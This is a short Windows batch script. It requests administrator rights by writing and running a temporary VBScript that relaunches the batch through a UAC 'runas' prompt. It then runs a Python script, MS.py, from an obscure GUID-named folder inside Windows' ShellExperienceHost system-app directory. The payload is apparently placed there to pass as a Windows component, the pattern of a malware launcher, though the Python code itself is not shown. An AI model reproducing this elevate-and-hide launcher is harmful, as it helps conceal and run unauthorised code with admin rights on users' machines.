@echo off
:: BatchGotAdmin
:-------------------------------------
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
:: End BatchGotAdmin

set "userprofilepath=%userprofile%"
for %%F in ("%userprofilepath%") do set "username=%%~nxF"

python "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\pris\NFAH\_YE12842D-71D7-4477-A44B-7FA65F11C153\MSAS\MS.py"
cd "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\pris\NFAH\_YE12842D-71D7-4477-A44B-7FA65F11C153\MSAS"
python MS.py
exit
